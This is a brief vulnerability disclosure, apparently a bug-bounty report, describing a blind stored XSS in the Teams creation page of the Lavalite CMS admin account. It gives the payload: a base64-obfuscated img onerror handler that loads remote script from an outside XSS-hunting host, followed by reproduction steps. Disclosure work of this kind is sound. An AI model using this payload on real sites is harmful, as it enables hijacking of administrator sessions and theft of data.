# Description
Blind XSS triggered at Teams creation page of lavalite CMS admin account. 
# Payload USED
```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmVlZmVlLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
```
# POC
* create anew team with name as the xss payload and save it the just open the page again.
* Booyah!!! XSS triggered.
# PermaLinks
[drive link](https://drive.google.com/drive/folders/1Yur7pAeci-lTklfReEum_yAJr4MJM9py?usp=sharing)
